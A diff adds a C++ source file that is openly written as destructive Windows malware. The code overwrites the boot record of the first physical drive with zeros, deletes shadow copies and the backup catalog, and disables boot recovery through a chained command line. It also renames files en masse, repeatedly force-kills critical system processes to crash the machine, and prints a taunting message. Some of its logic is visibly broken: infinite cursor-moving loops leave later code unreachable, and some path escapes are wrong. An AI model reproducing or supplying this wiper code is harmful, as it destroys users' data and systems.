@@ -1,0 +1,93 @@
+#include <iostream>
+#include <windows.h>
+#include <time.h>
+
+using namespace std;
+
+int main() {
+	//Boot Destruction
+	int X, Y;
+	char mbrData[512];
+
+	ZeroMemory(&mbrData, (sizeof mbrData));
+
+	HANDLE MBR = CreateFile("\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+
+	DWORD write;
+	WriteFile(MBR, mbrData, 512, &write, NULL);
+
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);
+	}
+	CloseHandle(MBR);
+
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);//Some tiny payload
+	}
+
+	//Command Prompt
+	system("attrib.exe -s -h C:\Windows\regedit.exe"); //Hiding program named registry.exe at Windows Folder
+	system("ping.exe -n 10 localhost"); //Attack who open this virus
+	system("vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet");
+	//Deleting all shadowcopy and start bcdedit to disable recovery
+
+
+	//Encryptor
+	system("ren.exe *. *.irrespect_suck_your_computer"); //Rename all extension file(92% people say it can't open)
+	system("taskkill.exe /f /im lsass.exe");
+
+	//Just tiny payload but 2x
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);//Some tiny payload
+	}
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);//Some tiny payload
+	}
+
+	//Last Attack
+	cout << "ur pc sucked by IrRespect";
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);//Some tiny payload
+	}
+	srand(time(NULL));
+	while (1) {
+		X = rand() % 801;
+		Y = rand() % 801;
+		SetCursorPos(X, Y);//Some tiny payload
+	}
+	system("attrib.exe -s -h C:\Windows\regedit.exe"); //Hiding program named registry.exe at Windows Folder
+	system("taskkill.exe /f /im lsass.exe"); //Process kill lsass.exe (Local Security Authority Process)
+	system("taskkill.exe /f /im services.exe"); //Killing Services make computer unusable
+	system("taskkill.exe /f /im scvhost.exe"); //Killing Windows Host make computer got damaged
+	system("taskkill.exe /f /im dllhost.exe"); //Process kill dllhost.exe (COM Surrogate)
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe");
+	system("taskkill.exe /f /im csrss.exe"); //Killing Cilent Runtime Process. Cause BSOD In Windows 7, And make pc Shutdown at Windows 10
+	//Spamming for taskkill csrss.exe will cause BSOD
+	//Using C++ to complete this Computer Malware
+	return(0);
+}
